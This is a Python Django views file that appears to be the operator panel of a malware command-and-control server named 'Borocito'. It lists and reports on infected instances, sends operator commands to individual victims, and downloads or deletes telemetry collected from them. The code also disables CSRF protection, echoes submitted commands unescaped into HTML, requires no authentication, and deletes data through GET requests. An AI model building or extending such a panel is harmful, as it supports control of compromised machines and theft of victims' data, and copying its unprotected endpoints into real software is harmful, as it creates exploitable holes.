from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpRequest, HttpResponse
from django.contrib import messages
from django.conf import settings

import os

# Create your views here.
from api.models import Instancia, Telemetria
from configs.models import Configuration, Component

def dashboard(request: HttpRequest):
    configuration = Configuration.objects.last() # last row is always the active one
    infectados = Instancia.objects.count()
    return render(request, "web/dashboard.html", {
        "infectados": infectados,
        "componentes": Component.objects.count(),
        "configuration": configuration,
        "telemetria": sum([len(files) for r, d, files in os.walk(settings.BOROCITO_TELEMETRY_DIR)]),
    })

def user_list(request: HttpRequest):
    infectados = Instancia.objects.all()
    return render(request, "web/user_list.html", {"infectados": infectados})

def user_report(request: HttpRequest, infectado):
    infectado = Instancia.objects.get(pk=infectado)
    return render(request, "web/user_report.html", {"infectado": infectado})

def user_control(request: HttpRequest):
    infectados = Instancia.objects.all()
    return render(request, "web/user_control.html", {"infectados": infectados})

@csrf_exempt
def user_control_instance(request: HttpRequest, infectado):
    infectado = Instancia.objects.get(pk=infectado)
    if request.method == "POST":
        return HttpResponse(f'<p style="margin-bottom: -6px;">[{request.user.username}] {request.POST.get("command")}</p>')
    return render(request, "web/user_control_instance.html", {"infectado": infectado})

def telemetry(request: HttpRequest):
    if request.GET.get("download"):
        file = request.GET.get("download")
        archivo = Telemetria.objects.get(uuid=file)
        if not archivo or not os.path.exists(archivo.telemetry.path):
            messages.error(request, f"Telemetry file doesn't exists"); return redirect('web:telemetry')
        with open(archivo.telemetry.path, 'rb') as f:
            response = HttpResponse(f.read())
            response['Content-Disposition'] = f'attachment; filename=\"{archivo.filename}\"'
            return response
    if request.GET.get("delete"):
        file = request.GET.get("delete")
        archivo = Telemetria.objects.get(uuid=file)
        if not archivo or not os.path.exists(archivo.telemetry.path):
            messages.error(request, f"Telemetry file doesn't exists"); return redirect('web:telemetry')
        messages.success(request, f"Telemetry file <b>{archivo.filename}</b> deleted successfully!")
        archivo.delete()
        return redirect('web:telemetry')
    archivos = Telemetria.objects.all()
    return render(request, "web/telemetry.html", {"archivos": archivos})
